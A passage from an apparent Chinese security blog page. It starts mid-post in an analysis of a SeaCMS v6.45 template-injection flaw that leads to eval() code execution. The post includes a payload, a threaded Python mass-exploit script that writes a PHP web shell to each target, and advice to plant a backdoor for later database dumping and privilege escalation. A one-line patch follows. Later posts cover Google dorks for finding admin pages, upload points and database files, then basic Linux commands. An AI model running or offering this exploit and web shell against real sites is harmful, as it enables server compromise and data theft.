str_replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, <span class="variable">$strElseIf0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="string">&quot;if(&quot;</span> . <span class="variable">$strElseIf0</span> . <span class="string">&quot;)&#123;\$resultStr=\&quot;<span class="subst">&#123;$strElseIfThen0&#125;</span>\&quot;;\$elseIfFlag=true;&#125;&quot;</span>);</span><br><span class="line">                <span class="variable">$content</span> = str_replace(<span class="variable">$iar</span>[<span class="number">0</span>][<span class="variable">$m</span>], <span class="variable">$resultStr</span>, <span class="variable">$content</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到下面存在<code>eval()</code>函数来执行代码，要想进入到<code>eval()</code>，<code>$content</code>中必须含有<code>&#123;if:</code>字符串。</p>
<p>然后是正则，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$labelRule</span> = buildregx(<span class="string">&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;</span>,<span class="string">&quot;is&quot;</span>);</span><br><span class="line">preg_match_all(<span class="variable">$labelRule</span>,<span class="variable">$content</span>,<span class="variable">$iar</span>);</span><br></pre></td></tr></table></figure>

<p>看代码执行流程，在<code>eval()</code>函数中，<code>$strIf</code>就是之前<code>preg_match_all()</code>中第一个<code>(.*?)</code>匹配出来的值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="string">&quot;if(&quot;</span>.<span class="variable">$strIf</span>.<span class="string">&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>在<code>eval()</code>中，要闭合前面的if语句，可以构造<code>1)phpinfo();if(1</code>，又要符合正则<code>&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;</code>，再看标签：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;最新上映&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>由于<code>$order</code>替换的是<code>&#123;searchpage:ordername&#125;</code>，所以，在<code>1)phpinfo();if(1</code>基础上添加。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;&#123;end <span class="keyword">if</span>&#125;&#123;<span class="keyword">if</span>:<span class="number">1</span>)phpinfo();<span class="keyword">if</span>(<span class="number">1</span>&#125;&#123;end <span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞利用的基本流程就是这样，简单来说，就是有个可控的变量没有经过过滤，就被带入了<code>eval()</code>中，导致了代码执行。</p>
<h3 id="0x05-getshell"><a href="#0x05-getshell" class="headerlink" title="0x05 getshell"></a>0x05 getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">author:YuanzhengTong-2016211597</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>]== <span class="string">&quot;-f&quot;</span>:</span><br><span class="line">        target=target[<span class="number">0</span>]</span><br><span class="line">    url=target+<span class="string">&quot;/search.php&quot;</span></span><br><span class="line">    payload = &#123;<span class="string">&quot;searchtype&quot;</span>:<span class="number">5</span>,<span class="string">&quot;order&quot;</span>:<span class="string">&quot;&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&quot;</span>,<span class="string">&quot;func&quot;</span>:<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;fwrite(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[f0rmat])?&gt;f0rmat&#x27;);&quot;</span>&#125;</span><br><span class="line">    shell = target+<span class="string">&#x27;/shell.php&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.post(url,data=payload)</span><br><span class="line">        verify = requests.get(shell, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;f0rmat&quot;</span> <span class="keyword">in</span> verify.content:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Write success,shell url:&#x27;</span>,shell,<span class="string">&#x27;pass:f0rmat&#x27;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;success.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(shell+<span class="string">&#x27;  pass:f0rmat&#x27;</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> target,<span class="string">&#x27;Write failure!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&lt;<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;python check_order.py.py -h target/-f target-file&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;-h&quot;</span>:</span><br><span class="line">            exploit(sys.argv[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;-f&quot;</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                b = f.readlines()</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(b)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> b[i] == <span class="string">&quot;\n&quot;</span>:</span><br><span class="line">                        threading.Thread(target=exploit, args=(b[i].split(),)).start()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="0x06-关于漏洞的进一步利用"><a href="#0x06-关于漏洞的进一步利用" class="headerlink" title="0x06 关于漏洞的进一步利用"></a>0x06 关于漏洞的进一步利用</h3><p>因为它可以前台执行代码，所以我们不妨给其种马，然后就可以维持长期的权限，后期无论是脱库还是提权都方便了很多</p>
<p>这里给出一个tips</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/upload/search.php</span></span><br><span class="line">POST:searchtype=<span class="number">5</span>&amp;order=&#125;&#123;end <span class="keyword">if</span>&#125; &#123;<span class="keyword">if</span>:<span class="number">1</span>)print_r(<span class="variable">$_POST</span>[a](<span class="variable">$_POST</span>[b]));<span class="comment">//&#125;&#123;end if&#125;&amp;a=assert&amp;b=phpinfo();</span></span><br></pre></td></tr></table></figure>

<h3 id="0x07-防护"><a href="#0x07-防护" class="headerlink" title="0x07 防护"></a>0x07 防护</h3><p>临时性的解决方案（参考大佬的博客）（本来想对比一下新版本和此版本的区别，然而并不能找到比V6.45再新一个版本的了）</p>
<p>64行加上：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$order</span> = (<span class="variable">$order</span> == <span class="string">&quot;commend&quot;</span> || <span class="variable">$order</span> == <span class="string">&quot;time&quot;</span> || <span class="variable">$order</span> == <span class="string">&quot;hit&quot;</span>) ? <span class="variable">$order</span> : <span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>



<h3 id="0x08-Refer"><a href="#0x08-Refer" class="headerlink" title="0x08 Refer"></a>0x08 Refer</h3><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/CMS-Hunter/tree/master/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">https://github.com/SecWiki/CMS-Hunter/tree/master/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C</a></p>
<p><a target="_blank" rel="noopener" href="http://0day5.com/archives/4249/">http://0day5.com/archives/4249/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35078631/article/details/76595817">https://blog.csdn.net/qq_35078631/article/details/76595817</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/06/18/2018-06-18-Google%20hacker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/06/18/2018-06-18-Google%20hacker/" class="post-title-link" itemprop="url">google hacker</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-06-18 00:00:00" itemprop="dateCreated datePublished" datetime="2018-06-18T00:00:00+08:00">2018-06-18</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="0x01高级操作符"><a href="#0x01高级操作符" class="headerlink" title="0x01高级操作符"></a>0x01高级操作符</h2><ul>
<li>高级搜索 <strong>inurl：xxx</strong></li>
</ul>
<p>可以查询url中有xxx的网页，可以用来找后台登录页面如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:login_admin.asp</span><br></pre></td></tr></table></figure>

<p>可以用来找上传页面如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:upload_soft.asp</span><br></pre></td></tr></table></figure>

<ul>
<li>高级搜索 <strong>intext：xxx</strong></li>
</ul>
<p>把网页中的正文内容中的某个字符做为搜索条件,可以用来查看网站目录如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intext：to paremt directory</span><br></pre></td></tr></table></figure>

<ul>
<li>高级搜索 <strong>Filetype：xxx</strong></li>
</ul>
<p>搜索指定文件，可以用来查数据库如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Filetype：mdb</span><br></pre></td></tr></table></figure>

<ul>
<li>高级搜索 <strong>site：xxx</strong></li>
<li>intitle:搜索网页标题中是否有所输入字符</li>
<li>cache:<br>搜索google里关于某些内容的缓存</li>
<li>define:<br>搜索某个词语的定义,搜索:define:hacker,将返回关于hacker的定义.</li>
<li>info:<br>查找指定站点的一些基本信息.</li>
<li>link:<br>例如搜索:inurl:<a target="_blank" rel="noopener" href="http://www.4ngel.net可以返回所有和www.4ngel.net做了链接的url/">www.4ngel.net可以返回所有和www.4ngel.net做了链接的URL</a>.</li>
<li>site:</li>
</ul>
<p>这个也很有用,例如:site:<a target="_blank" rel="noopener" href="http://www.4ngel.net.将返回所有和4ngel.net这个站有关的url/">www.4ngel.net.将返回所有和4ngel.net这个站有关的URL</a>.</p>
<p>related：搜索所有链接到指定链接的相关URL</p>
<p>+把google可能忽略的字列如查询范围<br>-把某个字忽略<br>~同意词<br>.单一的通配符<br>*通配符，可代表多个字母<br>“”精确查询</p>
<h2 id="0x02-组合使用法（示例）："><a href="#0x02-组合使用法（示例）：" class="headerlink" title="0x02 组合使用法（示例）："></a>0x02 组合使用法（示例）：</h2><ol>
<li>搜索相关页面（或数据库文件）<br>Site:xxx Filetype:mdb<br>Site:xxx intext: to parent directory<br>Site:xxx intext: to parent directory Filetype:mdb</li>
<li>下载到数据库后，登陆后台管理<br>Site:xxx intitle:管理<br>Site:xxx inurl:login.asp</li>
<li>直接找上传点<br>Site:xxx inurl:upload.asp</li>
</ol>
<p><em>注意：robot.txt是针对搜索引擎机器人的存文本文件，可以说明不对robot访问的部分</em></p>
<h2 id="0x03-相关链接"><a href="#0x03-相关链接" class="headerlink" title="0x03 相关链接"></a>0x03 相关链接</h2><p><a target="_blank" rel="noopener" href="http://blog.whiterabbitxyj.com/2017/10/16/googlesearchskill/">Google高级搜索hacker技巧</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/06/07/2018-06-07-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/06/07/2018-06-07-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">Linux常用命令</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-06-07 00:00:00" itemprop="dateCreated datePublished" datetime="2018-06-07T00:00:00+08:00">2018-06-07</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="一、Linux-入门体验"><a href="#一、Linux-入门体验" class="headerlink" title="一、Linux 入门体验"></a>一、Linux 入门体验</h1><h2 id="1-1-root用户登陆"><a href="#1-1-root用户登陆" class="headerlink" title="1.1 root用户登陆"></a>1.1 root用户登陆</h2><h2 id="1-2-图形化与纯字符模式切换"><a href="#1-2-图形化与纯字符模式切换" class="headerlink" title="1.2 图形化与纯字符模式切换"></a>1.2 图形化与纯字符模式切换</h2><p>init 5 - 图形模式<br>init 3 - 纯字符模式</p>
<h2 id="1-3-重要热键"><a href="#1-3-重要热键" class="headerlink" title="1.3 重要热键"></a>1.3 重要热键</h2><p>Tab —— 自动补全命令<br>Ctrl+C —— 终止正在运行的程序<br>Ctrl+d —— 退出字符界面(终端)</p>
<h2 id="1-4-用户和用户组"><a href="#1-4-用户和用户组" class="headerlink" title="1.4 用户和用户组"></a>1.4 用户和用户组</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.4.1 用户信息存放在 vi /etc/passwd/</span><br><span class="line">1.4.2 用户组—— 访问控制权限</span><br><span class="line">      一个用户可以属于不同的组</span><br><span class="line">      vi /etc/group/</span><br></pre></td></tr></table></figure>

<h2 id="1-5-文件属性"><a href="#1-5-文件属性" class="headerlink" title="1.5 文件属性"></a>1.5 文件属性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">terminal： ll </span><br><span class="line"></span><br><span class="line">eg. - rwx r-x -wx  </span><br><span class="line"></span><br><span class="line">1.文件类型(1位)  </span><br><span class="line"></span><br><span class="line">2.文件所有者访问权限（3位）——按位表示，如果不具备则相应位显示-  </span><br><span class="line"></span><br><span class="line">3.文件所属组用户访问权限（3位）</span><br><span class="line"></span><br><span class="line">4.其他用户访问权限（3位）</span><br><span class="line"></span><br><span class="line">P.S. &quot;-&quot;普通文件；&quot;x&quot;可执行文件；&quot;d&quot;目录文件</span><br></pre></td></tr></table></figure>

<h1 id="二、Linux-命令详解"><a href="#二、Linux-命令详解" class="headerlink" title="二、Linux 命令详解"></a>二、Linux 命令详解</h1><h2 id="2-1-用户管理类命令"><a href="#2-1-用户管理类命令" class="headerlink" title="2.1 用户管理类命令"></a>2.1 用户管理类命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">useradd [option] username  //1.添加用户</span><br><span class="line">userdel [option] [username]//2.删除用户</span><br><span class="line">passwd  [option] [username]//3.修改密码</span><br><span class="line">su      [option] [username]//4.切换用户</span><br><span class="line">eg. su - root              //切换到root用户，并将root用户的环境变量同时带入(option -)</span><br><span class="line">groupadd [option][groupname]//5.添加用户组</span><br><span class="line">groupdel [option][groupname]//6.删除用户组</span><br><span class="line"></span><br><span class="line">p.s. 1.clear //清屏</span><br><span class="line">     2. /（一个反斜杠表示根目录）</span><br></pre></td></tr></table></figure>



<h2 id="2-2-文件与目录类命令"><a href="#2-2-文件与目录类命令" class="headerlink" title="2.2 文件与目录类命令"></a>2.2 文件与目录类命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">//1.查看目录(不含隐藏文件)</span><br><span class="line">ls [选项][目录或文件] </span><br><span class="line">ls -a /home          // 显示目录下所有文件(含隐藏目录)</span><br><span class="line">ls -l /home          // 显示目录下文件的详细信息</span><br><span class="line"></span><br><span class="line">//2.跳转工作目录 (Change Directory)</span><br><span class="line">cd  目录名          </span><br><span class="line">cd  ..               //退回到上一级目录</span><br><span class="line">cd  -                //回到上次访问目录</span><br><span class="line"></span><br><span class="line">//3.复制文件/目录(copy)</span><br><span class="line">cp /home/test  /temp //将test文件copy到/temp目录下</span><br><span class="line">cp -r /home/dir1 /temp//将dir1目录copy到/temp目录下</span><br><span class="line"></span><br><span class="line">//4.移动或更名（move）</span><br><span class="line">mv /home/test /home/test1 //将/home目录下的test文件更名为test1</span><br><span class="line">mv /home/dir1 /temp/      //将dir1 目录移动（剪切）到/temp 目录下</span><br><span class="line"></span><br><span class="line">//5.删除文件/目录(remove)</span><br><span class="line">rm /home/test   //删除文件</span><br><span class="line">rm -r /home/dir1   //删除目录</span><br><span class="line"></span><br><span class="line">//6.改变文件权限 (change mode)</span><br><span class="line">格式： chmod[who][+ |- |= ][mode] 文件名</span><br><span class="line">参数：</span><br><span class="line">/who:</span><br><span class="line">    u 表示文件所有者</span><br><span class="line">    g 表示与文件所有者同组的用户</span><br><span class="line">    o 表示其他用户</span><br><span class="line">    a 表示所有用户(default)</span><br><span class="line">/mode:</span><br><span class="line">    + 添加权限</span><br><span class="line">    - 取消权限</span><br><span class="line">    = 赋予给定权限</span><br><span class="line">chmod u+w hello.c</span><br><span class="line"></span><br><span class="line">//7.创建目录 mkdir</span><br><span class="line"></span><br><span class="line">//8.查看目录大小</span><br><span class="line">    du /temp</span><br><span class="line">//9.查看当前绝对路径</span><br><span class="line">    pwd</span><br></pre></td></tr></table></figure>



<h2 id="2-3-压缩打包类命令"><a href="#2-3-压缩打包类命令" class="headerlink" title="2.3 压缩打包类命令"></a>2.3 压缩打包类命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">//后缀名不同，处理命令不同</span><br><span class="line">*.gz &lt;-&gt; gzip命令压缩的文件</span><br><span class="line">*.bz2 &lt;-&gt; bzip2命令压缩的文件</span><br><span class="line">*.tar &lt;-&gt; tar命令打包的文件</span><br><span class="line"></span><br><span class="line">//压缩！=打包</span><br><span class="line">//打包：大小基本不变</span><br><span class="line">*.tar.gz &lt;-&gt; tar 打包后，再经过gzip压缩的文件</span><br><span class="line">*.tar.bz2 &lt;-&gt; tar命令打包后，再经过bzip2压缩的文件</span><br><span class="line"></span><br><span class="line">//1.压缩解压 gzip</span><br><span class="line">gzip /root/ks.cfg   //压缩 Compression</span><br><span class="line">gzip -d /ks.cfg.gz  //解压 Decompression</span><br><span class="line"></span><br><span class="line">//2.压缩解压 bzip2 </span><br><span class="line">//用法同gzip</span><br><span class="line">bzip2 /root/ks.cfg  //压缩 Compression</span><br><span class="line">bzip2 -d /ks.cfg.gz     //解压 Decompression</span><br><span class="line"></span><br><span class="line">//3.打包压缩 tar</span><br><span class="line">//c表示打包，v表示输出整个过程的详细信息，f表示 后面要跟上输出文件名称,cv顺序可变，f一般放最后</span><br><span class="line">tar cvf tmp.tar /tmp //将tmp目录打包成 tmp.tar文件</span><br><span class="line">tar xvf tmp.tar      //将打包文件.tar解开</span><br><span class="line"></span><br><span class="line">tar cvzf tmp.tar.gz /tmp //将tmp目录打包为一个 *.tar.gz文件</span><br><span class="line">tar xvzf tmp.tar.gz      //将打包文件*.tar.gz解开</span><br><span class="line"></span><br><span class="line">//相关选项参数[option]</span><br><span class="line">//区分大小写    </span><br><span class="line">-c    创建压缩文件  </span><br><span class="line"></span><br><span class="line">-x    解开压缩文件  </span><br><span class="line"></span><br><span class="line">-t    查看压缩包内有那些文件</span><br><span class="line"></span><br><span class="line">-z    用Gzip压缩或解压  </span><br><span class="line"></span><br><span class="line">-j    用bzip2压缩或解压 </span><br><span class="line"></span><br><span class="line">-v    显示压缩或解压的过程 </span><br><span class="line"></span><br><span class="line">-f    目标文件名  </span><br><span class="line"></span><br><span class="line">-p    保留原始的权限与属性    </span><br><span class="line"></span><br><span class="line">-P    使用绝对路径来压缩</span><br><span class="line"></span><br><span class="line">-C    指定解压到的目录 </span><br><span class="line">   </span><br></pre></td></tr></table></figure>



<h2 id="2-4-磁盘管理类命令"><a href="#2-4-磁盘管理类命令" class="headerlink" title="2.4 磁盘管理类命令"></a>2.4 磁盘管理类命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    //1.加载U盘or光盘</span><br><span class="line">    mount [option] 设备名 挂载目录</span><br><span class="line">    mount /dev/cdrom /mnt </span><br><span class="line"></span><br><span class="line">    //2.卸载光盘</span><br><span class="line"></span><br><span class="line">    umount 挂载目录 //前提为退出挂载目录</span><br><span class="line"></span><br><span class="line">    //3.查看磁盘使用情况 df</span><br><span class="line">    df -hl </span><br><span class="line"></span><br><span class="line">    //4.创建新文件  </span><br><span class="line">    touch 文件名</span><br><span class="line"></span><br><span class="line">    //5.文件链接 ln </span><br><span class="line">    //类比windows 快捷方式.lnk</span><br><span class="line"></span><br><span class="line">    ln oldfile hlink //为oldfile文件创建硬链接</span><br><span class="line">    ln -s oldfile slink //为oldfile文件创建软链接</span><br><span class="line">P.S. 软硬链接区别</span><br><span class="line">1.Linux链接概念</span><br><span class="line">Linux链接分两种，一种被称为硬链接（Hard Link），另一种被称为符号链接（Symbolic Link）。默认情况下，ln命令产生硬链接。</span><br><span class="line"></span><br><span class="line">【硬连接】</span><br><span class="line">硬连接指通过索引节点来进行连接。在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都给它分配一个编号，称为索引节点号(Inode Index)。在Linux中，多个文件名指向同一索引节点是存在的。一般这种连接就是硬连接。硬连接的作用是允许一个文件拥有多个有效路径名，这样用户就可以建立硬连接到重要文件，以防止“误删”的功能。其原因如上所述，因为对应该目录的索引节点有一个以上的连接。只删除一个连接并不影响索引节点本身和其它的连接，只有当最后一个连接被删除后，文件的数据块及目录的连接才会被释放。也就是说，文件真正删除的条件是与之相关的所有硬连接文件均被删除。</span><br><span class="line"></span><br><span class="line">【软连接】</span><br><span class="line">另外一种连接称之为符号连接（Symbolic Link），也叫软连接。软链接文件有类似于Windows的快捷方式。它实际上是一个特殊的文件。在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。</span><br><span class="line"></span><br><span class="line">example：常规删除文件后，软连接失效，硬连接仍可访问原文件</span><br></pre></td></tr></table></figure>



